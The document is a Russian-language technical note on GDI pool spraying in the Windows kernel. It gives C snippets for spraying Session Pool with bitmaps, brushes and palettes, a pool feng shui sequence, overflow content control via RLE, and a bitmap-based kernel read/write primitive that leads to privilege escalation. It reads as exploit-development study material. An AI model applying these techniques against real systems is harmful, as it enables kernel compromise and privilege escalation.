# GDI Pool Spray в Windows Kernel

Техника контроля размещения данных в Session Pool через GDI-объекты.
Используется для эксплуатации win32k уязвимостей (write-overflow, use-after-free, pool corruption).

## Session Pool

Все win32k/win32kfull аллокации идут в **Session Pool** — отдельную область пула,
принадлежащую текущей сессии (Session 0 для сервисов, Session 1+ для пользователей).
Не путать с Paged Pool и NonPaged Pool — у них другие аллокаторы.

Win32k использует собственный аллокатор поверх стандартного pool manager'а ядра.

## GDI-объекты для спрея

### Bitmap (HBITMAP)

Самый точный контроль размера. Размер аллокации = `sizeof(SURFACE) + pixel_data`.

```c
// 32-битный битмап 100x100 = ~40000 байт пикселей + заголовок
HBITMAP hBmp = CreateBitmap(100, 100, 1, 32, pixelData);

// DIB Section — еще точнее, можно задать битмап напрямую
HBITMAP hDib = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &pBits, NULL, 0);
```

Структура в пуле:
```
[ BASEOBJECT    ]  0x18 байт — заголовок GDI
[ SURFOBJ       ]  ~0x60 байт — Surface Object
[ pixel data    ]  width * height * bpp / 8 байт
```

### Brush (HBRUSH)

Мелкие стабильные аллокации, ~0x60-0x80 байт.

```c
for (int i = 0; i < 10000; i++)
    hBrush[i] = CreateSolidBrush(RGB(0x41, 0x41, 0x41));
```

### Palette (HPALETTE)

Фиксированный размер 0x400+ байт. Удобно для medium-sized chunks.

```c
LOGPALETTE *pal = malloc(sizeof(LOGPALETTE) + 256 * sizeof(PALETTEENTRY));
pal->palVersion = 0x300;
pal->palNumEntries = 256;
for (int i = 0; i < 256; i++) {
    pal->palPalEntry[i].peRed   = 0x41;
    pal->palPalEntry[i].peGreen = 0x41;
    pal->palPalEntry[i].peBlue  = 0x41;
}
HPALETTE hPal = CreatePalette(pal);
```

### Region (HRGN)

Переменный размер. Создаётся через `CreateRectRgn`, `ExtCreateRegion`.

```c
HRGN hRgn = CreateRectRgn(0, 0, 100, 100);
```

## Pool Feng Shui

Основная стратегия — заполнить pool предсказуемым паттерном,
освободить нужные слоты, разместить victim-объект рядом с overflow-зоной.

```
Шаг 1: Drain free list (заполнить все дыры)
         [obj][obj][obj][obj][obj][obj][obj][obj]

Шаг 2: Освободить каждый второй (создать предсказуемые дыры)
         [obj][---][obj][---][obj][---][obj][---]

Шаг 3: Victim занимает целевую дыру
         [obj][VIC][obj][---][obj][---][obj][---]

Шаг 4: Trigger overflow
         [obj][VIC][obj][###OVERFLOW###>>>]
                       ^--- перезаписывает victim
```

```c
// Пример feng shui
#define TARGET_SIZE  0x1000
#define SPRAY_COUNT  1000

// Шаг 1: заполнить
HANDLE objs[SPRAY_COUNT];
for (int i = 0; i < SPRAY_COUNT; i++)
    objs[i] = CreateBitmap(64, 64, 1, 32, pattern);

// Шаг 2: создать дыры
for (int i = 0; i < SPRAY_COUNT; i += 2) {
    DeleteObject(objs[i]);
    objs[i] = NULL;
}

// Шаг 3: жертва
HBITMAP victim = CreateBitmap(64, 64, 1, 32, controlledData);

// Шаг 4: trigger
GetDIBits(hdc, hSourceBitmap, 0, height, pBits, &bmi, DIB_RGB_COLORS);
```

## Контроль содержимого overflow

Для write-overflow через GDI (GetDIBits/EncodeRLE):
- Пиксельные данные исходного битмапа → становятся содержимым RLE-потока
- RLE encoding позволяет контролировать что именно пишется за границу
- Pattern `0xAA 0xBB` (repeat) и literal runs дают разный уровень контроля

```c
// Пиксели в исходном битмапе → RLE данные в overflow
BYTE pixels[HEIGHT][WIDTH];
memset(pixels, 0x44, sizeof(pixels));  // повторяющийся pattern → RLE run

// EncodeRLE8 запишет:
//   0xNN 0x44  (repeat 0x44 NN раз)  → контролируемый write
```

## Защитные механизмы

| Механизм | Версия | Влияние |
|---|---|---|
| Session Pool ASLR | Win10+ | Рандомизация placement |
| Segment Heap | Win10 1607+ | Случайные sized bins |
| Pool Guard | Win8+ | Guard pages между allocations (debug) |
| CFG | Win10+ | Control Flow Guard на indirect calls |
| kASLR | Win8+ | Рандомизация базы kernel |
| HVCI | Win10 1809+ | VBS-based integrity |

## Чтение/перезапись GDI объектов из kernel

Через `SetBitmapBits` / `GetBitmapBits` из usermode:

```c
// Записать controlled data в SURFACE (kernel pool chunk)
SetBitmapBits(hBitmap, size, attackerBuffer);

// Прочитать данные из kernel pool (info leak)
GetBitmapBits(hBitmap, size, outputBuffer);
```

Это ключевой примитив — если удалось перезаписать SURFOBJ другого битмапа,
можно через `GetBitmapBits`/`SetBitmapBits` получить arbitrary read/write в kernel.

## Классический паттерн эксплойта

```
1. Spray GDI objects (Bitmap) → заполнить Session Pool
2. Feng shui → создать hole рядом с victim
3. Trigger vulnerability → overflow перезаписывает соседний SURFOBJ
4. Модифицировать pvScan0 в SURFOBJ → arbitrary kernel R/W через Bitmap API
5. Записать token privileges / overwrite HalDispatchTable → escalate
```

## Ссылки

- j00ru — CVE-2017-0058 (NtGdiGetDIBitsInternal DoS)
- Morten Schenk — "Win32k Pool Overflow Exploitation" (BlackHat 2017)
- CESG — "Windows 10 Segment Heap" research
- NCC Group — "GDI Heap Spray" techniques
